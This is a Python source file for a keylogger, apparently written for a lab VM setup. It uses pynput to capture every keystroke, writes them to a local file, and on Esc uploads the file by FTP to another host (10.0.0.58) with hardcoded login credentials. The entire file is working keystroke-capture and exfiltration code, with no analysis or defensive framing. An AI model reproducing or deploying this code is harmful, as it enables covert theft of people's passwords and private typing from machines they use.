import pynput
from pynput.keyboard import Key, Listener
from ftplib import FTP

count=0
keys=[]
file = "keylogs.txt"

def exfiltrate_file(file):
	try:
		ftp = FTP("10.0.0.58")
		ftp.login("vmuser", "ab12cd34")
		with open(file, "rb") as f:
			ftp.storbinary(f"STOR {file}", f)
		ftp.quit()
		print("Exfiltrated " + file + " to Ubuntu VM")
	except Exception as e:
		print("Exfiltration failed:", e)

def on_press(key):
	global keys, count
	keys.append(key)
	count += 1
	print("{0} pressed".format(key))
	if count > 0:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open(file, "a") as f:
		for key in keys:
			k = str(key)
			if k.startswith("'") and k.endswith("'"):
				letter  = k.strip("'")
				f.write(letter)			
			elif k.startswith("Key.shift"):
				f.write("")
			elif k.startswith("Key.space"):
				f.write("\n")
			elif k.startswith("Key."):
				name = k.split(".", 1)[1]
				f.write("\n")
				f.write(f"[{name}]")
			else:
				f.write(k)
		

def on_release(key):
	if key == Key.esc:
		exfiltrate_file(file)
		return False

with Listener(on_press=on_press, on_release=on_release) as listener: 
	listener.join()
 
